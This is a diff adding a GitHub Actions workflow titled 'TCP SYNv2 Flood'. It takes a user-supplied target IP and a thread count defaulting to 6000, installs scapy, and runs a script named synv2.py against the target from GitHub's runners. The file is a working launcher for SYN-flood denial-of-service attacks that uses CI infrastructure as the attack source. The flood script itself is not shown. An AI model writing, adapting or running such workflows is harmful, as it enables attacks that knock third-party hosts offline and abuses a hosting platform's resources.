@@ -1,0 +1,30 @@
+name: TCP SYNv2 Flood
+
+on:
+  workflow_dispatch:
+    inputs:
+      iptgt:
+        description: "IP Target"
+        required: true
+      threads:
+        description: "Threads"
+        required: true
+        default: "6000"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+    - name: Set up Python 3.9
+      uses: actions/setup-python@v2
+      with:
+        python-version: 3.9
+    - name: Install dependencies
+      run: |
+        sudo python -m pip install --upgrade pip
+        sudo pip install scapy
+        if [ -f requirements.txt ]; then sudo pip install -r requirements.txt; fi
+    - name: Starting Flood...
+      run: |
+        sudo python synv2.py ${{ github.event.inputs.iptgt }} ${{ github.event.inputs.threads }}
